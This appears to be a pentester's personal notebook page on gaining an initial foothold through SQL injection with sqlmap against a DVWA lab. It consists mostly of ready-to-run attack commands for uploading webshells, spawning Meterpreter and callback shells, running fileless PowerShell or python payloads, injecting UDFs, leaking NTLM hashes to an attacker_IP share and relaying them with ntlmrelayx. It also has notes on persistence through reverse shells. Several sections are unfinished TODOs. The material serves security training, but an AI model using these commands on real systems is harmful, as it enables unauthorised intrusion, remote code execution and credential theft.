# 05 - Initial Foothold

Search Tag: #sql-injection #sqlmap #initial-foothold #persistence #webshell #dvwa

## 4.1 - Webshell

### 4.1.1 - Conditions

1. The DB user must have **FILE** and **SELECT** privileges with the flags `--privileges -U CU`.
2. Find the web root directory using the enumeration methods.
3. The web root directory must have write permissions.

### 4.1.2 - Upload a specific Webshell

Refer to this [[Pentesting Phases/Initial Access/Callback Shells/Webshells/Webshells|link]] to generate interactive weevely webshells and click [[Weevely|here]] for post exploitation section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
```

### 4.1.3 - Spawn an Interactive Webshell

TODO: Provide **\[INFO\]** logs  to demonstrate a different between a file web stager (the uploader file) and a backdoor (an interactive shell)

Great thing about SQLMap that not only it uploads an interactive **web backdoor (the webshell)** it also comes with the **web file stager (the uploader)**.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-shell --web-root="/var/www/html/dvwa/"
```

### 4.1.4 - Spawn a Meterpreter Shell

- Start a shell handler listener in Metasploit to retrieve a callback meterpreter session.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-pwn --web-root="/var/www/html/dvwa/"
```

Note: when using the `--priv-esc` flag this is for targeting Windows operating systems to automate using the `getsystem` function for impersonation.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --random-agent --os-pwn --web-root="/var/www/html/dvwa/" --priv-esc
```

### 4.1.5 - Execute OS Command

#### 4.1.5.1 - General

- Execute any command

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="whoami"
```

#### 4.1.5.2 - Linux

- Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/tmp/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python /tmp/shell.py"
```

- Execute the callback shell in memory (fileless memory)

1. Copy the file in `/dev/shm/` directory

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/dev/shm/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python /dev/shm/shell.py"
```

2. Execute a one liner

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python -c <payload>"
```

#### 4.1.5.3 - Windows

TODO: Fill in this info to test a windows environment

- Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/shell.exe" --file-dest="C:/windows/temp/shell.exe"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="cmd /c C:/windows/temp/shell.exe"
```

- Execute the callback shell in memory (fileless memory) via powershell

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="powershell -e <base64_encoded>"
```

- Execute the callback shell in memory (fileless memory) via python

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python -c <payload>"
```

## 4.2 - User Defined Function

TODO: Test UDF for MySQL and check what conditions does it requires.

### 4.2.1 - Conditions

1. The DB user must have **FILE** and **SELECT** privileges with the flags `--privileges -U CU`.

### 4.2.2 - General

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --udf-inject
```

### 4.2.3 - Linux

TODO: Compile the shared object linux file execute a callback shell when uploading it to the MySQL DBMS

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --udf-inject --shared-lib=/path/to/file.so
```

### 4.2.4 - Windows

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --udf-inject --shared-lib=/path/to/file.dll
```


--cleanup           Clean up the DBMS from sqlmap specific UDF and tables


## 4.3 - Out-of-Band

### 4.3.1 - Conditions

1. The DB user must have **FILE** and **SELECT** privileges with the flags `--privileges -U CU`.

### 4.3.2 - Windows

TODO: Fill in this info to test a windows environment

TODO: Test this and place it where it's appropriate

#### 4.3.1.2 - Grab NTLM hashes

- Run [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes. This also can be done with [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^0c8cfd|metasploit SMB relay auxiliary module]] including [[Impacket|ntlmrelayx]].

- Responder

```

```

- Metasploit Framework

```
smb_relay
```

- Impacket ntlmrelayx

```
$ sudo impacket-ntlmrelayx -t smb://<target_IP> -smb2support
```

- Exploit the webserver via SQL injection manually using either `--file-read` or `--sql-query`.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="\\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --sql-query="SELECT LOAD_FILE('\\\\<attacker_IP>\\snare.txt')"
```

#### 4.3.2.2 - SMB Relay Callback Shell

##### 4.3.2.2.1 - Automated

- Exploit the webserver via SQL injection with `--os-smbrelay` but run with root privileges.

```
$ sudo sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-smbrelay
```

##### 4.3.2.2.2 - Manual

- Repeat the [[05 - Initial Foothold|previous step]] and launch [[Impacket|ntlmrelayx]] and/or [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Active/Responder/Usage|Responder]] to receive a callback shell connection. This can be done with [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^c109ec|metasploit SMB relay exploit module]].

```
$ sudo impacket-ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
```

## 4.4 - Persistence

### 4.4.1 - Windows

TODO: See if it's possible to upload a reverse shell in the startup folder with `--file-write` and `--file-dest`.

TODO: See if it's possible to upload a backdoored with legit program such as, setup installer.

---
## References

- [Hacking Articles: File System Access on Webserver Using SQLmap](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)

- [Hacking Articles: Shell uploading in Web Server using Sqlmap](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)

- [Hacking Articles: Command Injection Exploitation through Sqlmap in DVWA (OS-cmd)](https://www.hackingarticles.in/command-injection-exploitation-through-sqlmap-in-dvwa/)

- [IOSec: SQLmap](https://iosec.in/sqlmap-4/)

- [Executing OS Commands Through MySQL](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql)

- [Hacking Articles: Exploiting the Webserver using Sqlmap and Metasploit (OS-Pwn)](https://www.hackingarticles.in/exploiting-webserver-using-sqlmap-metasploit-os-pwn/)

- [Advanced SQL injection to operating system full control](https://owasp.org/www-pdf-archive/AppsecEU09-Damele-A-G-Advanced-SQL-injection-slides.pdf)

- [MySQL Out-of-Band Hacking](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)